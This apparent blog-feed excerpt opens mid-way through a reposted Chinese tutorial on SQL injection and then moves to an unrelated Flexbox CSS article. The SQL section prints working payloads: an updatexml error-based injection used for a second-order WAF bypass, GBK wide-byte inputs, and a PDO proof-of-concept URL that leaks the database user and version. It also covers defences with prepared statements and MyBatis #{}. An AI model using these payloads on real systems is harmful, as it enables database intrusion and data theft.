UPDATE nowcoder SET uname &#x3D; &#39;&#39;or updatexml(1,concat(0x7e,(user())),0) or &#39;&#39;WHERE id &#x3D; 1

从而在报错提示中爆出当前数据库用户名：
ERROR 1105(HY000): XPATH syntax error: &#39;~root@localhost&#39;

当Web应用外层有WAF存在时，会检查用户输入，为了兼顾用户体验，不做过滤或拦截处理，而是转义引号，执行的SQL语句变为：
UPDATE nowcoder SET uname &#x3D; &#39;\&#39; or updatexml(1,concat(0x7e,(user())),0) or \&#39;&#39;WHERE id &#x3D; 1

可以看到黑客传入的攻击Payload已失效，&#39;被转义为&#39;后已经单纯变为一个单引号字符，不再具有闭合其他单引号的功能，于是整个Payload完全变为了一个字符串。若此时有另外一处获取用户写过的文章标题的功能由于需要跨表查询用到了这个用户名：
id&#x3D;_SESSION[&#39;id&#39;];
&#x2F;&#x2F;嵌套查询
mysql_query(&quot;SELECT title FROM passage WHERE uname &#x3D; (SELECT uname FROM nowcoder WHERE id &#x3D; $id)&quot;);
&#x2F;&#x2F;或是使用JOIN
mysql_query(&quot;SELECT title FROM passage JOIN nowcoder WHERE passage.uname &#x3D; nowcoder.uname AND nowcoder.id &#x3D; $id&quot;);

以上的代码都是没问题的，但这里仅仅是举个简单易懂的例子，实际情况中，可能这个SQL非常复杂，可能是受一些场景限制，导致程序员不得不先将uname的值从nowcoder中取出来，再丢进passage表中查询：
id &#x3D; _SESSION[&#39;id&#39;];
query &#x3D; mysql_query(&quot;SELECT uname FROM nowcoder WHERE id &#x3D;id&quot;);
res &#x3D; mysql_fetch_assoc(query);
uname &#x3D; res[&#39;uname&#39;];
mysql_query(&quot;SELECT title FROM passage WHERE uname &#x3D; &#39;$uname&#39;&quot;);

此时第4行中$uname的值为刚刚存入的&#39; or updatexml(1,concat(0x7e,(user())),0) or &#39;，那个具有闭合功能的单引号又回来了！于是最后执行：
SELECT title FROM passage WHERE uname &#x3D; &#39;&#39;or updatexml(1,concat(0x7e,(user())),0) or &#39;&#39;；

成功绕过WAF爆出当前用户名。
宽字节注入宽字节在如今UTF-8编码盛行的时代已经很少露面了，但宽字节注入却是安全工程师校招面试中面试官最爱问的问题之一，在我所经历的几十场面试中，有60%以上涉及到了对宽字节注入的理解。
宽字节注入本质上是多字节编码的问题，很多PHP程序喜欢使用addslashes对用户输入进行转义，如果用户输入中存在&#39;，则会被转义为&#39;，失去闭合其他引号的功能。但反斜杠也是可以被转义的，若可以在&#39;前添加一个反斜杠，使其变为&#39;，第二个反斜杠便会因为被转义而失去了转义引号的功能，使得引号逃逸，重新拥有了闭合其他引号的能力，因此，吃掉转义引号的反斜杠是宽字节注入的根本。最常规的宽字节注入场景便是当使用addslashes防御SQL注入，且MySQL数据库的连接层编码被设为GBK的时候：
mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);
id &#x3D; addslashes(id&#x3D;addslashes(_GET[&#39;id&#39;]);
mysql_query(&quot;SELECT * FROM nowcoder WHERE id &#x3D; $id&quot;);

黑客在地址栏传入%df%27，其中%27是&#39;的URL编码。当addslashes侦测到引号时，进行转义，添加一个反斜杠(%5c)，变为%df%5c%27。而MySQL在解析SQL语句时使用了多字节的GBK编码，当首个字节（高位）的ASCII码大于128时，就被认为是一个汉字，每个汉字占两字节，而%df正好符合这一要求。于是%df%5c%27被解析为%df%5c%27，即運&#39;，成功吃掉转义引号的反斜杠，造成单引号逃逸。这里并没有使用上面反斜杠转义反斜杠的方法，而是直接使引号前的反斜杠成为多字节编码中汉字的低位，从而达到吃掉反斜杠的目的。想要通过这种方式造成宽字节注入，必须保证数据库连接层使用多字节编码解析SQL语句，还要保证这种编码的字符集中存在低位是0x5C的字符（0X5C是反斜杠）。GB2312与UTF8虽然是多字节编码，但它们都不存在低位为0X5C的字符，也就不能造成宽字节注入。
那么，将MySQL连接层编码设为UTF-8就可以完全避免宽字节注入了吗？看下面这个例子：
mysql_query(&quot;SET NAMES &#39;UTF-8&#39;&quot;);
id &#x3D; iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, addslashes(id&#x3D;iconv(&quot;GBK&quot;, &quot;UTF−8&quot;,addslashes(_GET[&#39;id&#39;]));
mysql_query(&quot;SELECT * FROM nowcoder WHERE id &#x3D; $id&quot;);

这里MySQL连接层使用了UTF-8编码，为了避免乱码，使用iconv函数将用户提交的GBK字符经addslashes过滤后，先转为UTF-8，再拼入SQL语句，此时黑客只需在地址栏传入%e5%5c%27，即可再次使单引号逃逸，过成如下：真正防御宽字节注入的方法，是在设置MySQL连接层编码为UTF-8的同时，使用mysql_real_escape_string函数来替代addslashes函数过滤用户输入，两者的不同之处在于mysql_real_escape_string会考虑当前MySQL连接层编码的字符集，避免出现宽字节注入的情况。
预编译时代的注入预编译底层原理安全面试中经常会有这样的问题：如何防御SQL注入？除了之前所列举的WAF、过滤转义等方式，预编译参数化查询才是最好的防御方式。
如今已经是预编译时代，上述手动用户输入的防SQL注入方式普遍存在于老代码中，新项目通常使用参数绑定的方式来处理SQL语句，如PHP的PDO，Java的PreparedStatement，或使用一些诸如Spring Data JPA、Hibernate、Mybatis的ORM框架。通俗的讲，预编译防止SQL注入的原理是提前编译SQL语句，将所有的用户输入都当做『数据』，而非『语法』，相信这也是大多数人所知晓的。一个面试官曾在面试中提出这样的问题：为什么预编译能让传入的数据只能是数据，它的底层原理是怎样的？
我们先从PHP的PDO说起。PDO针对预编译提供了两种模式：本地预编译和模拟预编译。模拟预编译并不是真正的预编译，它为了兼容一些不支持预编译的数据库，由PDO对用户输入转义后，拼接到SQL语句中，再将完整的语句交由数据库执行。这种行为可以理解为是新瓶装旧酒，它的预编译由PDO完成而非MySQL，并且这是PDO的默认模式。
执行以下PHP代码：
stmt &#x3D; PDO-&gt;prepare(&quot;SELECT * FROM nowcoder WHERE id &#x3D; ?&quot;);
stmt-&gt;bindParam(1,stmt−&gt;bindParam(1,_GET[&#39;id&#39;]);
$stmt-&gt;execute();

开启MySQL日志功能，并抓取SQL执行日志。
Id   Command    Argument
------------------------
4170 Connect    root@localhoston nowcoder
4170 Query      SELECT * FROM nowcoder WHERE id &#x3D; &#39;1\&#39;&#39;
4170 Quit

如日志所示，数据库内部处理的整个过程只有连接、查询、退出三个操作,并没有预编译的过程。让我们开启本地预编译模式：
$PDO -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
stmt &#x3D; PDO -&gt; prepare(&quot;SELECT * FROM nowcoder WHERE id &#x3D; ?&quot;);
stmt -&gt; bindParam(1,stmt−&gt;bindParam(1,_GET[&#39;id&#39;]);
$stmt -&gt; execute();

执行后再次查看日志：
Id   Command    Argument
------------------------
4171 Connect    root@localhoston nowcoder
4171 Prepare    SELECT * FROM nowcoder WHERE id &#x3D; ?
4171 Execute    SELECT * FROM nowcoder WHERE id &#x3D; &#39;1\&#39;&#39;
4171 Close      stmt
4171 Quit

如日志所示，整个流程分为五步，分别为连接、预编译、传入参数并执行、关闭预编译语句、退出。Java也面临同样的问题，虽然PreparedStatement名义上是SQL注入，但如果不深入了解，一般开发者并不会知晓其实所谓的预编译默认都是模拟预编译，即由PreparedStatement亲自将SQL语句转义为无危害的语句后，直接交由数据库执行。
那么既然默认情况下的模拟预编译是由PDO自行转义的，那么是否可能存在漏洞呢？是的，根据前文所介绍的内容，我们很容易就可以联想到宽字节注入。其实，在PHP 5.3.6之前，PDO确实存在宽字节注入的问题。为了方便同学们尝试，在这里放出较为完整的代码：
&lt;?php
    $pdo &#x3D; newPDO(&quot;mysql:host&#x3D;127.0.0.1;dbname&#x3D;nowcoder;charset&#x3D;gbk&quot;,&quot;root&quot;,&quot;123456&quot;);
    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo-&gt;query(&#39;SET NAMES GBK&#39;);
    var &#x3D; _GET[&#39;name&#39;];
    $query &#x3D; &quot;SELECT * FROM nowcoder WHERE name &#x3D; ?&quot;;
    stmt &#x3D; pdo-&gt;prepare($query);
    stmt-&gt;execute(array(stmt−&gt;execute(array(var));
    r &#x3D; stmt-&gt;fetch();
    print_r($r);
?&gt;

此时只需在地址栏中输入：
http:&#x2F;&#x2F;localhost&#x2F;pdo.php?name&#x3D;%bf%27%20UNION%20SELECT%20user(),version()--%20a

页面上就会暴露出当前数据库用户名与数据库版本（由于使用了联合查询，要求前后SELECT的列数相同，这里的nowcoder表存在两列），成功实现了宽字节注入。此代码在LNMP、MySQL 5.5.62、PHP 5.2.17下实测成功。由于前文详细讲述了宽字节注入的原理及细节，在这里就不进行细讲了，有兴趣的同学可以找《PDO防注入原理分析以及使用PDO的注意事项》这篇文章来看。虽然这是PDO一个巨大的破绽，但其条件较为苛刻，仍使用PHP低版本且使用GBK作为数据库连接层字符集的场景应该已经不多了。
PHP的预编译内藏乾坤，那么Java的会不会也存在这样的问题呢？同样做个实验：
String JDBC_DRIVER &#x3D; &quot;com.mysql.jdbc.Driver&quot;;
String DB_URL &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;test&quot;;
try&#123;
    Class.forName(JDBC_DRIVER);
    Connection conn &#x3D; DriverManager.getConnection(DB_URL,USER,PASS);
    String sql &#x3D; &quot;SELECT * FROM user WHERE id &#x3D; ?&quot;;
    String Parameter &#x3D; &quot;1&#39;&quot;;
    PreparedStatement ps &#x3D; conn.prepareStatement(sql);
    ps.setString(1, Parameter);
    ps.executeQuery();
&#125; catch(ClassNotFoundException e) &#123;
    e.printStackTrace();
&#125; catch(SQLException e) &#123;
    e.printStackTrace();
&#125;

截取部分日志如下：
Id   Command    Argument
------------------------
3479 Connect    root@localhoston test using TCP&#x2F;IP
3479 Query      SHOW COLLATION
3479 Query      SET NAMES latin1
3479 Query      SET character_set_results &#x3D; NULL
3479 Query      SET autocommit&#x3D;1
3479 Execute    SELECT * FROM user WHERE id &#x3D; &#39;1\&#39;&#39;

可以发现，使用了PrepareStatement却并未出现预编译的日志！原来，Java中也是默认由其本身进行转义后直接运行无危害语句的，若想使用真正的预编译，必须在连接数据库时加上useServerPrepStmts=true。如下，修改数据库链接字符串：
String DB_URL &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;test?useServerPrepStmts&#x3D;true&quot;;

再次执行，截取部分日志如下：
Id   Command    Argument
------------------------
3480 Connect    root@localhoston test using TCP&#x2F;IP
3480 Query      SHOW COLLATION
3480 Query      SET NAMES latin1
3480 Query      SET character_set_results &#x3D; NULL
3480 Query      SET autocommit&#x3D;1
3480 Prepare    SELECT * FROM user WHERE id &#x3D; ?
3480 Execute    SELECT * FROM user WHERE id &#x3D; &#39;1\&#39;&#39;

可以看到日志中第8行已进行预编译。
了解到PHP与Java中关于预编译的一些知识后，我们来揭晓预编译可以防止SQL注入的原因。网上对此的回答大多都停留在预编译会将传入的数据只当做数据，而不当做SQL语句的层面，非常的浅显。为什么预编译会将数据只当成数据？它是如何进行时别的呢？事实是，它不需要进行识别。
通常来说，一条SQL语句从传入到运行经历了生成语法树、执行计划优化、执行这几个阶段。在预编译过程中，数据库首先接收到带有预编译占位符?的SQL语句，解析生成语法树(Lex)，并缓存在cache中，然后接收对应的参数信息，从cache中取出语法树设置参数，然后再进行优化和执行。由于参数信息传入前语法树就已生成，执行的语法结构也就无法因参数而改变，自然也就杜绝了SQL注入的出现。这样一个深刻而简单的原因，相信已经解答了我们最开始的疑问。
漫谈ORM说起ORM框架，最容易使人联想到的便是Spring Data JPA、Hibernate和Mybatis这些Java类库，其中坑比较多的是Mybatis。Mybatis在Java白盒代码审计中有一个著名的漏洞，就是在XML Mapper中使用绑定变量会导致SQL注入，因为绑定变量会导致SQL注入，因为的底层处理是直接拼接，而#的底层处理才是预编译参数绑定。那么这些开发者为什么不全用#反而使用$？难道他们傻吗？真正的原因是，使用#绑定的变量在很多场景是不生效的。下面我们就来对此进行详细分析。
写过Mybatis插件的开发者知道，Mybatis会将XML Mapper中的绑定符转换为真正的预编译占位符，并将变量依次与其绑定，如：
&lt;select id&#x3D;&quot;getUsers&quot;resultType&#x3D;&quot;User&quot;&gt;
    SELECT * FROM nowcoder WHERE id&#x3D;$&#123;id&#125;
&lt;&#x2F;select&gt;

Mybatis会处理为：
SELECT * FROM nowcoder WHERE id &#x3D; ?

真正的参数值储存在Parameters中，并且会提供一个名为ParameterMappings的Array提供占位符们与Parameters中值的绑定关系。假设有这样一个Mapper：
&lt;select id&#x3D;&quot;getUsers&quot;resultType&#x3D;&quot;User&quot;&gt;
    SELECT * FROM nowcoder  WHERE name LIKE &#39;%#&#123;name&#125;%&#39;
&lt;&#x2F;select&gt;

Mybatis便会处理为：
SELECT * FROM nowcoder WHERE name LIKE &#39;%?%&#39;

然而这样的预编译方式是错误的，mysql-connector会爆一个找不到占位符的错误。通过阅读mysql-connector处理预编译语句的源码，我们得知其会逐个字符检索占位符?，同时会计算字符是在引号内还是引号外，引号内的？是不算做占位符的。mysql-connector的用意很明显，就是为了避免字符串中正常的？被解析为占位符，这也导致了LIKE后无法正常预编译的结果。此时很多开发者会使用拼接的方式来解决这个问题，对应到Mybatis中也就变成了使用$。
真正的LIKE预编译可以这么写：
SELECT * FROM nowcoder WHERE name LIKE CONCAT(&#39;%&#39;, ?, &#39;%&#39;)

这样占位符？在引号外，自然也就被成功检测到了。对应到Mybatis中，便是：
&lt;select id&#x3D;&quot;getUsers&quot;resultType&#x3D;&quot;User&quot;&gt;
    SELECT * FROM nowcoder  WHERE name LIKE CONCAT(&#39;%&#39;, #&#123;name&#125;, &#39;%&#39;)
&lt;&#x2F;select&gt;

与此相同的还有IN语句，MySQL中不存在这样的预编译语法：
SELECT * FROM nowcoder WHERE id IN ?

因此，也就不能使用类似于IN #{ids}的Mapper。正确的IN语句预编译如下：
SELECT * FROM nowcoder WHERE id IN (?, ?, ?, ?)

首先要知道IN后的参数中有多少个元素，然后在语句中写入相同个数的占位符?，这一点在直接使用PreparedStatement时非常繁琐，需要编写额外的逻辑获取中元素个数后拼接占位符，Mybatis对此提供了foreach标签：
&lt;select id&#x3D;&quot;getUsers&quot;resultType&#x3D;&quot;User&quot;&gt;
    SELECT * FROM nowcoder  WHERE id IN
    &lt;foreach collection&#x3D;&quot;ids&quot;index&#x3D;&quot;index&quot;item&#x3D;&quot;id&quot;separator&#x3D;&quot;,&quot;open&#x3D;&quot;(&quot;close&#x3D;&quot;)&quot;&gt;
        #&#123;id&#125;
    &lt;&#x2F;foreach&gt;
&lt;&#x2F;select&gt;

另外，表名与列名是不能被预编译的，这是由于在预编译生成语法树的过程中，预处理器在检查解析后的语法树时，会确定数据表和数据列是否存在，此两者必须为具体值，不能被占位符?所替代，这就导致了ORDER BY、GROUP BY后同样不能使用#，只能使用$。而对于此场景防止SQL注入，不建议使用过滤或转义手段，而是将表名、列名定义为常量，当用户输入匹配某一常量时，再将此常量传入SQL语句中，否则就使用默认值。
上述情况中，LIKE/IN的场景下一般写失效，而表名/列名动态传入的场景下没有#的对应写法，导致开发者使用$，这是安全从业者和开发者共同需要注意的地方。
预编译的破绽上个章节解释了LIKE &#39;%?%&#39;不生效的原因，这样的常规预编译不生效会带来很多拼接。那么由Mybatis推广开来，往往预编译不容易办到或办不到的场景，在日常渗透测试与代码审计中更应引起我们的关注。总结如下：

白盒审计中PDO、PreparedStatement中开发者直接拼接SQL语句的行为，很多开发者以为使用了安全的类库就保证了安全，殊不知错误的用法仍会导致漏洞。
白盒审计中ORDER BY后的表名动态传入的SQL语句；渗透测试中允许用户传入按某个字段进行排序的行为，这很有可能是直接拼接的。
白盒审计中ORDER BY后排序方式(ASC/DESC)动态传入的SQL语句；渗透测试中允许用户选择正序倒序排列的行为，需要抓包查看是否直接传入ASC/DESC，若是则很有可能存在拼接行为。
白盒审计中模糊查询是否拼接；渗透测试中针对搜索行为进行SQL注入测试。
白盒审计中IN语句后是否拼接。

这样有针对性的进行试探和检查，能更有效的帮助我们找到漏洞。
结语本篇文章深刻剖析了SQL注入的原理，介绍了几个较为实用的绕过WAF的方式，最重要的是，对预编译的底层及攻防进行了详细介绍，这是目前常见资料中较为少见的。笔者可以负责任的说，虽然SQL注入已经在各个方面得到了有效控制，但在企业内网，注入问题仍然层出不穷。对于注入的透彻理解，将会非常有助于在安全面试中脱颖而出。本系列将会致力于这一点，在深度和广度上对一个大厂安全工程师应掌握的安全知识进行详细介绍。

转载:https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11fhttps://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be

]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Flex布局介绍</title>
    <url>/2021/04/03/Flex%E5%B8%83%E5%B1%80%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[Flexbox 布局 已是目前最为流行的 Web 布局方式之一，它给 Web 开发者在完成页面或组件的 UI 布局带来了极大的灵活性和便利性。但也是因为它有极大的灵活性，里面隐藏了一些不为人知的细节，如果不是对 Flexbox 极为熟悉或者对其规范极为了解的话，其中有很多细节将会被遗漏，而这些细节又会让你在使用的感到困惑，甚至是带来一定的麻烦。
这次在优化 imgcook 的 Flexbox 布局时，重新阅读了一次 Flexbox 的规范，发现自己曾忽略了部分重要信息。为此在这篇文章中，将 Flexbox 布局，CSS 的书写模式，逻辑属性，对齐方式结合在一起整理了一篇笔记，希望对于想了解或使用 Flexbox 碰到痛楚的同学有所帮助。


一些术语和概念Flexbox 术语术语的统一有助于我们后面更好的讨论和解决问题。用下图来描述 Flexbox 中的术语：


主轴和侧轴只有在 Flexbox 布局体系中才有这样的概念，并不是水平方向永远都是主轴（Main Axis），垂直方向永远是侧轴（Cross Axis）。主轴和侧轴除了会受 Flexbox 中的 flex-direction 取值的影响之外，还会受 CSS 的书写模式 writing-mode 和 direction 以及 HTML 的 dir 属性的影响！

块轴和内联轴CSS Box Alignment Module Level 3 引入了两个新的概念，即 块轴（Block Axis）和 内联轴（Inline Axis） :

  块轴 是沿 块 (block) （比如段落元素）的布局方向延伸的轴， 它会垂直穿过行内轴 
  内联轴 是在使用特定写作模式中，沿句子单词的流动方向的轴。比如对于英语或者中文来说， 内联轴是水平的 


同时 块轴（Block Axis）又常称为列（Column）, 内联轴（Inline Axis）又常称为行（Row）:
 
虽然目前为止在 Flexbox 规范和 Grid 规范中都有自身关于对齐方式的描述，但 CSS 中有关于对齐方式都将收口到 Box Alignment 模块中；为此后面对说轴的说法更多的是 “ 块轴 ” 和 “ 行内轴 ”，结合到 Flexbox 布局中，轴的对应关系是：

  行内轴（Inline Axis）也对标 Flexbox 中的主轴 Main Axis
  块轴（Block Axis）也对标 Flexbox 中的侧轴 Cross Axis


块轴和行内轴同样受 CSS 的书写模式 writing-mode 和 direction 以及 HTML 的dir 属性影响。只不过，在 Flexbox 布局中，还受 flex-direction 属性的影响。

书写模式CSS Writing Modes Level 3 规范中的 writing-mode 和 direction 以及 HTML 中的 dir 属性对于 Flexbox 中的主轴和侧轴都会有影响，将会改变主轴和侧轴的方向。


逻辑属性块轴 、 内联轴 、 书写模式 的出现之后，就有了 块起点（Block Start）、块终点（Block End）、内联起点（Inline Start）和 内联终点（Inline End）: 

如果放到 Flexbox 布局中：

  内联起点（Inline Start） 等同于 Flexbox 布局中的 主轴起点（Main Start） 
  内联终点（Inline End） 等同于 Flexbox 布局中的 主轴终点（Main End） 
  块起点（Block Start） 等同于 Flexbox 布局中的 侧轴起点（Cross Start） 
  块终点（Block End） 等同于 Flexbox 布局中的 侧轴终点（Cross End） 

同时 CSS Logical Properties and Values Level 1 规范中引入了 block-start 、 block-end 、 inline-start 和 inline-end , 但它们和 Flexbox 中，Grid 中以入 Box Alignment 中的 flex-start 、 start 、 flex-end 和 end 是不等同的，也不是同一领域中的概念。这几个属性对应的是物理属性中的 top 、 right 、 bottom 和 left ：

也就是说，引入 CSS 逻辑属性之后，CSS 盒模型将分 物理盒模型 和 逻辑盒模型 :

CSS 属性也从此之后有 逻辑属性 和 物理属性 之分：


注意，CSS 逻辑属性也受 CSS 书写模式 writing-mode 、 directioin 属性和 HTML 的 dir 属性影响，而且不同组合之下也不同：


剩余空间（可用空间）和 不足空间在 Flexbox 布局模块中，Flex 容器中可能会包含一个或多个 Flex 项目。而 Flex 容器和 Flex 项目都有其自身的尺寸大小，那么就会有 Flex 项目尺寸大小之和大于或小于 Flex 容器的情景：

  当所有 Flex 项目尺寸大小之和小于 Flex 容器时，Flex 容器就会有多余的空间没有被填充，那么这个空间就被称为 Flex 容器的剩余空间（Positive Free Space）
  当所有 Flex 项目尺寸大小之和大于 Flex 容器时，Flex 容器就没有足够的空间容纳所有 Flex 项目（Flex 项目会溢出 Flex 容器），那么多出来的这个空间就被称为不足空间（Negative Free Space），也被称为负空间



Flex 容器 和 Flex 项目在元素上使用 display 设置值为 flex 或 inline-flex ，该容器会成为 Flex 容器，该容器下的子元素，包括 文本节点，伪元素。

使用 flex 和 inline-flex 的具体场景：

如果元素显式设置了 display 的值为 flex 或 inline-flex ,Flex 项目在未显式设置与尺寸大小有关的属性时，Flex 项目都将会按其内容大小来计算自身大小。

  设置为 display: flex 时，Flex 容器未显式设置与宽度相关的属性时，其宽度与其父容器等同（相当于 width: 100% ）
  设置为 display: inline-flex 时，Flex 容器未显式设置与宽度相关的属性时，其宽度等同于所有 Flex 项目的宽度和


当 Flex 容器中所有 Flex 项目所有宽和大于 Flex 容器时：

  设置为 display: flex 时，Flex 项目会溢出 Flex 容器
  设置为 display: inline-flex 时，Flex 项目会撑大 Flex 容器，有可能造成 Flex 容器溢出其父元素（或祖先元素）


使用 display: inline-flex 时最好结合 min-width 和 min-height 一起使用。不建议显式设置 width 和 height 。
display 设置为 flex 时，Flex 容器从表现形式上类似于块容器，事实它是一个 Flex 容器，上下文格式是 FFC（Flexbox Formatting Content），因此运用于块容器（Block Formatting Content）上的一些布局属性就不再适用，比如：

  CSS 的 column-*  属性在 Flex 容器上不起作用
  CSS 的 float  和 clear 属性在 Flex 项目上不起作用，也不会让 Flex 项目脱离文档流
  CSS 的 vertical-align 属性在 Flex 项目上不起作用
  CSS 伪元素 ::first-line  和 ::first-letter 在 Flex 容器上不起作用，而且 Flex 容器不会为其祖先提供首行或首字母格式化

有一点需要注意， 如果元素的 display的值为 inline-flex ，并且该元素显式的设置了 float 或 position 的值为 relative、 absolute 或 fixed，那么 display 的计算值是 flex， 即 Flex 容器表现行为和 display: flex 等同 。
运用于 Flex 容器上的属性
指定主轴方向在 Flex 容器中显式使用 flex-direction  可以指定主轴方向，如果未显式设置 flex-direction 属性，Flex 容器则会采用其默认值 row 。

上图展示的仅是阅读方式是 LTR(Left-to-Right)，如无特殊声明，接下来的文档不会因阅读方式（即 CSS 的 writing-mode 、 direction 和 HTML 的 dir 属性）列出不同的示意图。
除非需要显式的修改主轴方向，才需要在 Flex 容器上显式设置 flex-direction , 比如像下图这种排版本方式：
 
row-reverse 和默认值 row 表现恰恰相反，适用于下面这样布局场景：

在 Flexbox 布局中， flex-direction 在指定 Flex 容器主轴方向时，也会对 Flex 项目的排列顺序有影响（在不改变 DOM 结构，要实现反方向排版时，非常适合）。除了 flex-direction 可以影响 Flex 项目排列顺序之外，在 Flex 项目中显式使用 order 属性也可以，并且可以在不影响 DOM 结构，按照你自己任意想要的意图进行排序。
目前在 imgcook 中使用 Flexbox 布局时，在 Flex 容器上都会显式的设置 flex-direction 的值，即使是默认值： row 。在布局算法优化中，可以做相应的处理，只有在非 row 时才在 Flex 容器上显式设置 flex-direction ：

控制 Flex 项目是否换行（Flex 行）使用 flex-wrap 可以控制 Flex 项目在 Flex 容器换行的方式：

只有所有 Flex 项目宽度总和大于 Flex 容器主轴尺寸时，设置 flex-wrap 属性才能生效。
flex-wrap 取值为非 nowrap （即 wrap  和 wrap-reverse ）都可以让 Flex 项目换行（列）显式，其中 wrap-reverse 表现行为和 wrap 刚好相反。
组合效果表现效果效果 1效果 2效果 3效果 4效果 5效果 6效果 7效果 8

flex-direction 和 flex-wrap 可以简写成 flex-flow 。 flex-flow 使用时可以只显式设置一个值，也可以显式设置两个值：

  flex-flow 只显式设置一个值，并且该值和 &lt;flex-direction&gt; 相匹配时， flex-wrap 会取值 initial 
  flex-flow 只显式设置一个值，并且该值和 &lt;flex-wrap&gt; 相匹配时， flex-direction 会取值 initial 
  flex-flow 显式设置两个值时， flex-direction 和 flow-wrap 没有先后顺序之分，即可 flex-flow: column wrap 和 flex-flow: wrap column 等同

主轴方向对齐方式在 Flex 容器中使用 justify-content 来控制 Flex 项目在 Flex 容器主轴方向的对齐方式，也可以用来分配 Flex 容器中主轴方向的剩余空间。使用 justify-content 分配 Flex 容器剩余空间，主要是将剩余空间按不同的对齐方式，将剩余空间分配给 Flex 项目的两侧，即控制 Flex 项目与 Flex 项目之间的间距。
justify-content 存在两个规范中：

  CSS Flexible Box Layout Module Level 1
  CSS Box Alignment Module Level 3

在 Flexbox 布局模块中， justify-content 取值只要有以下六种：

需要注意 space-between 、 space-around 和 space-evenly 三者的差异：


  space-between 会让第一个 Flex 项目的盒子起始边缘与 Flex 容器主轴起点相稳合，最后一个 Flex 项目的盒子结束边缘与 Flex 容器主轴终点相稳合，其它相邻 Flex 项目之间间距相等。当 Flex 容器中只有一个 Flex 项目时，其表现行为和 flex-start 等同
  space-around 会让第一个 Flex 项目的盒子起始边缘与 Flex 容器主轴起点间距和最后一个 Flex 项目的盒子结束边缘与 Flex 容器主轴终点间距相等，并且等于其他相邻两个 Flex 项目之间间距的一半。当 Flex 容器中只有一个 Flex 项目时，其表现行为和 center 等同
  space-evenly 会让第一个 Flex 项目的盒子起始边缘与 Flex 容器主轴起点间距和最后一个 Flex 项目的盒子结束边缘与 Flex 容器主轴终点间距相等，并且等于其他相邻两个 Flex 项目之间间距。当 Flex 容器中只有一个 Flex 项目时，其表现行为和 center 等同

如果 Flex 容器没有额外的剩余空间，或者说剩余空间为负值时， justify-content 的值表现形式：

  flex-start 会让 Flex 项目在 Flex 容器主轴结束点处溢出
  flex-end 会让 Flex 项目在 Flex 容器主轴起点处溢出
  center 会让 Flex 项目在 Flex 容器两端溢出
  space-between 和 flex-start 相同
  space-around  和 center 相同
  space-evenly 和 center 相同

在 Flexbox 布局中，可以使用这些属性很好控制 Flex 容器的剩余空间，比如：

侧轴方向对齐方式在 Flexbox 容器中使用 align-items 来控制 Flex 项目在侧轴方向的对齐方式。

align-items 的默认值是 stretch ，但只有 Flex 项目示显式设置 height (或 width ) 值，Flex 项目才会被拉伸填满整个 Flex 容器。
如果 Flex 容器没有剩余空间或剩余空间为负值是：

  flex-start 会让 Flex 项目在 Flex 容器侧轴终点处溢出
  flex-end 会让 Flex 项目在 Flex 容器侧轴起点处溢出
  center 会让 Flex 项目在 Flex 容器侧轴两侧溢出
  baseline 会让 Flex 项目在 Flex 容器侧轴终点溢出，有点类似于 flex-start 

多行（列）对齐方式align-content 只适用于 Flex 容器在没有足够空间（所有 Flex 项目宽度之和大于 Flex 容器主轴尺寸），并且显式设置 flex-wrap 的值为非 wrap 时。

align-content 表现行为有点类似于 justify-cotent 控制 Flex 项目在主轴方向的对齐方式（分配 Flex 容器主轴剩余空间），而 align-content 可以用来控制多行状态下，行在 Flex 容器侧轴的对齐方式（分配 Flex 容器侧轴剩余空间）。可以把 align-content 状态下侧轴中的整行当作是 justify-content 状态下单个 Flex 项目。
align-content 还有一点不同之处，多了一个 stretch 值。当 Flex 容器中所有行的尺寸之和大于 Flex 容器侧轴尺寸（Flex 容器侧轴没有可用空间或可用空间为负值）时，各值表现行为：

  flex-start 会让 Flex 容器的行在侧轴结束点溢出
  flex-end 会让 Flex 容器的行在侧轴起点溢出
  center 会让 Flex 容器行在侧轴两端溢出
  stretch 表现行为类似于 flex-start 
  space-around 表现行为类似于 center 
  space-between 表现行为类似于 flex-start 
  space-evenly 表现行为类似于 center 

间距（行与行，列与列）gap 用来控制 Flex 项目之间的间距，但会忽略 Flex 项目与 Flex 容器边缘的间距：

运用于 Flex 项目的属性Flex 项目自身对齐方式在 Flex 容器上可以使用 justify-content 、 align-content 以及 align-items 分配 Flex 容器主轴和侧轴的空间（控制 Flex 容器中所有 Flex 项目对齐方式）。如果你需要对 Flex 项目个体对齐方式做处理，可以使用 align-self ：

align-self 取不同值的效果：

Flex 项目的 align-self 显式设置值为 auto 时不会覆盖 Flex 容器的 align-items ; 另外如果在 Flex 项目上显式设置 margin 的值为 auto 时，Flex 项目的 align-self 值将会失效。

类似上图这样的场景， align-self 就非常实用。
Flex 项目排序在 Flex 容器中使用 flex-direction 可以对 Flex 容器中的所有 Flex 项目按 “ LTR ”、“ RTL ”、“ TTB ” 或 “ BTT ” 方向排列。

  LTR ： flex-driection: row 
  RTL ： flex-direction: row-reverse 
  TTB : flex-direction: column 
  BTT : flex-direction: column-reverse 

在 Flex 项目上，还可以使用 order 指定具体的数值，在不改变 DOM 结构之下对 Flex 项目进行排序，其中数值越大，越在往后排：

在一些左右，上下互换顺序的时候，除了 flex-direction 之外，还可以在 Flex 项目设置 order ：

Flex 项目伸缩计算Flex 项目中使用 flex 属性可以根据 Flex 容器的可用空间对自身做伸缩计算，其包含三个子属性： flex-basis 、 flex-shrink 和 flex-grow 。这几个属性都有其初始值：

  flex-grow 的初始值为 0 
  flex-shrink 的初始值为 1 
  flex-basis 的初始值为 auto 

即 flex 的三个子属性： flex-grow （扩展比率）、 flex-shrink （收缩比率）和 flex-basis （伸缩基准）。这三个属性可以控制 Flex 项目，具体的表现如下：

  flex-grow ：设置 Flex 项目的扩展比率，让 Flex 项目得到（扩展）多少 Flex 容器剩余空间（Positive Free Space），即 Flex 项目可能会变大
  flex-shrink ：设置 Flex 项目收缩比率，让 Flex 项目减去 Flex 容器不足的空间（Negative Free Space），即 Flex 项目可能会变小
